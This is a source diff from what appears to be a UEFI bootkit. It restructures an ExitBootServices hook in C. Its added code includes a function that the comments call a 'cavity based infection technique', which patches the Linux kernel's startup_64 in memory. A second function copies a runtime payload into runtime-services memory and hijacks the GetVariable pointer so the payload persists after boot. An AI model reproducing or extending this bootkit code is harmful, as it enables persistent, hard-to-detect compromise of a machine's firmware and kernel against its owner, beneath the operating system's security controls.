@@ -61,15 +61,11 @@ void apply_patch(void *addr)
 }
 
 
-EFI_STATUS exit_bootservices_hook(EFI_HANDLE ImageHandle, UINTN MapKey)
+/* This is a cavity based infection technique, that works well for >6.6 kernels
+ */
+int try_direct_patching()
 {
-    EFI_STATUS status = 0;
-    // Could be potentially called twice, so deal with that.
-    if (called == 1) {
-        goto done;
-    }
-    called = 1;
-    
+    int res = 0;
     // Lets get the memory map
     UINTN mapsize = 0, mapkey, descriptorsize;
     EFI_MEMORY_DESCRIPTOR *map = NULL;
@@ -111,20 +107,26 @@ EFI_STATUS exit_bootservices_hook(EFI_HANDLE ImageHandle, UINTN MapKey)
         if (check_address(curr->PhysicalStart, curr->NumberOfPages)) {
             /* + 0x80 as that is startup_64 */
             apply_patch(curr->PhysicalStart + _startup_64);
-            goto done;
+            res = 1;
+            break;
         }
     }
 
-    /* If we make it here, it seems the kernel was not found, which should only
-     * happen in pre 6.6 kernels as exitbootservices is called much earlier in
-     * those. 
-     *
-     * Probably gonna need to allocate runtime memory here.
-     */
+    if (map != NULL) {
+        bootservices->FreePool(&map);
+    }
+
+    return res;
+}
+
+
+void install_runtime_hook()
+{
     char *data = NULL;
-    status = bootservices->AllocatePages(
+    EFI_STATUS status = bootservices->AllocatePages(
         AllocateAnyPages, EfiRuntimeServicesCode, 0x300, &data
     );
+
     if (status != EFI_SUCCESS) {
         while (1) {}
     }
@@ -132,17 +134,29 @@ EFI_STATUS exit_bootservices_hook(EFI_HANDLE ImageHandle, UINTN MapKey)
     /* Installing a runtime services hook */
     memcpy(data, runtime_bin, runtime_bin_len);
     /* Copy a few pointers */
+    /* -> The function we are hooking */
     memcpy(data, (void *) &(systable->RuntimeServices->GetVariable), 8);
+
+    /* -> Address of the field in the struct we replace */
     UINT64 a = &(systable->RuntimeServices->GetVariable);
     memcpy(data+8, (void *) &(a), 8);
-    systable->RuntimeServices->GetVariable = data + 16;
-    
-    //while (1) {}
 
-done:
-    if (map != NULL) {
-        bootservices->FreePool(&map);
+    /* And hook! */
+    systable->RuntimeServices->GetVariable = data + 16;
+}
+
+
+EFI_STATUS exit_bootservices_hook(EFI_HANDLE ImageHandle, UINTN MapKey)
+{
+    // Could be potentially called twice, so deal with that.
+    if (called == 1) {
+        goto done;
     }
+    called = 1;
+
+    install_runtime_hook();
+    
+done:
     return orig_exitbootservices(ImageHandle, MapKey);
 }
 
